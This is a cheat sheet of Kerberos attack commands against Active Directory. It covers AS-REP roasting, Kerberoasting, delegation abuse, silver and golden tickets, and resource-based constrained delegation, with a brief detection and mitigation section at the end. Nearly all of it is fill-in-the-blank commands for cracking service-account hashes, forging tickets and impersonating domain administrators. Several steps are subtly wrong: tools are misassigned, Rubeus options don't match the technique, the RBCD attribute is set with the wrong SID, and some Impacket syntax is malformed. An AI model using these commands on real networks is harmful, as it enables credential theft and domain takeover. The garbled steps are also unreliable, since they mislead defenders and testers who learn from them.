Here's a cheat sheet that covers **AS-REP Roasting, Kerberoasting, Delegation, Silver Ticket, and Golden Ticket** attacks from both Linux and Windows environments. These are common Kerberos-based attack techniques used in penetration testing and red teaming.

### **1. AS-REP Roasting**

**Purpose:** Exploit user accounts with Kerberos pre-authentication disabled to retrieve and crack their encrypted AS-REP response.

#### **Windows:**
- **Rubeus:**
  ```powershell
  Rubeus.exe asreproast
  ```
- **Mimikatz:**
  ```powershell
  sekurlsa::ekeys /export
  ```

#### **Linux:**
- **Impacket:**
  ```bash
  impacket-GetNPUsers -dc-ip <DC_IP> <domain_name>/ -usersfile <users.txt> -no-pass -format hashcat
  ```
- **Hashcat (cracking AS-REP hashes):**
  ```bash
  hashcat -m 18200 <hashes.txt> <wordlist.txt>
  ```

### **2. Kerberoasting**

**Purpose:** Extract and crack Kerberos Service Tickets (TGS) to obtain plaintext credentials of service accounts.

#### **Windows:**
- **Rubeus:**
  ```powershell
  Rubeus.exe kerberoast
  ```
- **Invoke-Kerberoast (PowerShell):**
  ```powershell
  Get-DomainUser -SPN | Get-DomainSPNTicket | Format-Custom -Property Hash
  ```

#### **Linux:**
- **Impacket:**
  ```bash
  impacket-GetUserSPNs -dc-ip <DC_IP> <domain_name>/<username>:<password> -request
  ```
- **Hashcat (cracking Kerberoast hashes):**
  ```bash
  hashcat -m 13100 <hashes.txt> <wordlist.txt>
  ```

### **3. Delegation Attacks**

**Purpose:** Abuse Kerberos delegation features (Unconstrained, Constrained, Resource-Based Constrained Delegation) to impersonate users.

#### **Unconstrained Delegation:**
- **Mimikatz (Windows):**
  ```powershell
  sekurlsa::tickets /export
  ```
- **Impacket (Linux):**
  ```bash
  impacket-getTGT -user <user> -domain <domain> -hashes <NTLM_hash> -outputfile <TGT.kirbi>
  ```

#### **Constrained Delegation:**
- **Rubeus (Windows):**
  ```powershell
  Rubeus.exe tgtdeleg
  ```
- **Impacket (Linux):**
  ```bash
  impacket-getST -target-user <target_user> -spn <SPN> -domain <domain> -tgt <TGT.kirbi>
  ```

### **4. Silver Ticket Attack**

**Purpose:** Create and inject forged service tickets (TGS) to impersonate a service account.

#### **Windows:**
- **Mimikatz:**
  ```powershell
  kerberos::golden /domain:<domain> /sid:<domain_SID> /target:<target_service> /rc4:<NTLM_hash> /user:<username> /id:<user_id> /ticket:<output_ticket.kirbi>
  ```
  ```powershell
  kerberos::ptt <output_ticket.kirbi>
  ```

#### **Linux:**
- **Impacket:**
  ```bash
  impacket-ticketer -nthash <NTLM_hash> -domain-sid <domain_SID> -domain <domain> -spn <SPN> <username>
  ```
  ```bash
  export KRB5CCNAME=<ticket.ccache>
  impacket-psexec -k -no-pass <target_ip>
  ```

### **5. Golden Ticket Attack**

**Purpose:** Create and inject a forged TGT (Ticket Granting Ticket) for domain persistence.

#### **Windows:**
- **Mimikatz:**
  ```powershell
  kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<krbtgt_NTLM_hash> /id:<user_id> /renewmax /ticket:<golden_ticket.kirbi>
  ```
  ```powershell
  kerberos::ptt <golden_ticket.kirbi>
  ```

#### **Linux:**
- **Impacket:**
  ```bash
  impacket-ticketer -nthash <krbtgt_NTLM_hash> -domain-sid <domain_SID> -domain <domain> -user <username> -groups <group_id> <username>
  ```
  ```bash
  export KRB5CCNAME=<golden_ticket.ccache>
  impacket-psexec -k -no-pass <target_ip>
  ```

### **6. Miscellaneous Commands**

- **Mimikatz:**
  ```powershell
  kerberos::list          # List Kerberos tickets
  kerberos::ptt <ticket>  # Pass-the-ticket
  ```
  
- **Impacket:**
  ```bash
  impacket-smbclient -k -no-pass <target> # SMB client with Kerberos
  impacket-wmiexec -k -no-pass <target>   # WMI exec with Kerberos
  impacket-psexec -k -no-pass <target>    # PsExec with Kerberos
  ```

This cheat sheet provides a comprehensive overview of the commands and tools used to perform various Kerberos-based attacks on both Windows and Linux environments. These techniques are used for privilege escalation, lateral movement, and domain persistence in penetration testing scenarios.

## RBCD Attacks

### **Resource-Based Constrained Delegation (RBCD) Attack Cheat Sheet**

**Resource-Based Constrained Delegation (RBCD)** is a Kerberos attack technique that allows an attacker to impersonate any user to a service configured for resource-based constrained delegation. This attack can be used for privilege escalation or lateral movement within an Active Directory environment.

---

### **1. Overview of RBCD**

- **What is RBCD?**
  - In a Windows domain, Constrained Delegation (CD) allows services to impersonate users for access to resources on behalf of the user. With **Resource-Based Constrained Delegation (RBCD)**, the resources themselves define which accounts can delegate to them, as opposed to the delegation being configured on the service account.

- **Attack Goal:**
  - The attacker configures a compromised account (or a controlled computer object) to impersonate a target user to a service with RBCD enabled, potentially leading to privilege escalation or lateral movement.

---

### **2. Basic Steps for RBCD Attack**

1. **Compromise a Low-Privileged Account:**
   - Obtain control over an account, either by obtaining credentials or compromising a machine where you have administrative privileges.

2. **Identify a Target Service with RBCD:**
   - Find a service account or computer object that has RBCD enabled.

3. **Modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` Attribute:**
   - Use a compromised account or computer object to modify the target service’s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to allow delegation on behalf of the user you wish to impersonate.

4. **Request a Service Ticket (TGS) as the Impersonated User:**
   - Request a service ticket from the Kerberos Key Distribution Center (KDC) for the target service as the user you want to impersonate.

5. **Use the Service Ticket to Access the Service:**
   - Use the obtained service ticket to authenticate to the target service and perform actions as the impersonated user.

---

### **3. RBCD Attack Commands**

#### **Windows:**

1. **Enumerate RBCD:**
   - Identify accounts or services with RBCD enabled:
   ```powershell
   Get-ADComputer -Filter * -Property msDS-AllowedToActOnBehalfOfOtherIdentity
   ```

2. **Set `msDS-AllowedToActOnBehalfOfOtherIdentity` Attribute:**
   - Using PowerView (part of PowerShell Empire):
   ```powershell
   $SID = (Get-DomainUser -Identity <username>).SID
   $SDDL = "O:SYG:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID)"
   Set-DomainObject -Identity <target_computer> -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDDL}
   ```

3. **Request a Service Ticket (TGS) for the Target Service:**
   - Using **Rubeus** to request a TGS as the impersonated user:
   ```powershell
   Rubeus.exe tgtdeleg /user:<target_user> /rc4:<NTLM_hash> /domain:<domain> /sid:<domain_SID> /target:<target_service>
   ```

4. **Use the Ticket for Impersonation:**
   - Use the service ticket with **Mimikatz** or **Rubeus**:
   ```powershell
   kerberos::ptt <TGS_ticket.kirbi>
   ```

#### **Linux:**

1. **Modify `msDS-AllowedToActOnBehalfOfOtherIdentity`:**
   - Using Impacket’s `setrbcd.py`:
   ```bash
   python3 setrbcd.py -dc-ip <DC_IP> -target-computer <target_computer> -sid <sid> <domain>/<user>:<password>
   ```

2. **Request a Service Ticket (TGS):**
   - Using Impacket’s `getST.py`:
   ```bash
   python3 getST.py -spn <SPN> -impersonate <target_user> -dc-ip <DC_IP> <domain>/<user>:<password>
   ```

3. **Use the Ticket:**
   - Export and use the ticket with Impacket tools:
   ```bash
   export KRB5CCNAME=<ticket.ccache>
   python3 impacket-psexec -k -no-pass <target_ip>
   ```

---

### **4. Example Attack Scenario**

**Scenario:**
- You have compromised a service account (e.g., `svc_account`) that has local admin privileges on a machine (e.g., `TARGET01`), and you want to escalate privileges to impersonate a domain admin (e.g., `Administrator`).

1. **Modify RBCD:**
   - Set `TARGET01` to allow `svc_account` to act on behalf of `Administrator`:
   ```powershell
   $SID = (Get-DomainUser -Identity Administrator).SID
   $SDDL = "O:SYG:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID)"
   Set-DomainObject -Identity TARGET01 -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDDL}
   ```

2. **Request TGS as `Administrator`:**
   - Use Rubeus to request a TGS for `cifs/TARGET01` as `Administrator`:
   ```powershell
   Rubeus.exe tgtdeleg /user:Administrator /rc4:<NTLM_hash> /domain:DOMAIN /sid:<domain_SID> /target:cifs/TARGET01
   ```

3. **Inject the Ticket and Access the Service:**
   - Inject the ticket using Mimikatz and access the service:
   ```powershell
   kerberos::ptt <TGS_ticket.kirbi>
   ```
   - Access the target:
   ```powershell
   Enter-PSSession -ComputerName TARGET01 -Credential DOMAIN\Administrator
   ```

---

### **5. Detection and Mitigation**

- **Detection:**
  - Monitor changes to `msDS-AllowedToActOnBehalfOfOtherIdentity`.
  - Use SIEM tools to track unusual SPN requests or TGS requests.
  - Analyze Kerberos logs for abnormal ticket granting patterns.

- **Mitigation:**
  - Limit the use of delegation and apply the principle of least privilege.
  - Regularly audit Active Directory delegation settings.
  - Monitor and restrict accounts that have sensitive delegation rights.

---

This cheat sheet provides a concise overview of the steps, tools, and commands involved in performing RBCD attacks, as well as measures for detection and mitigation.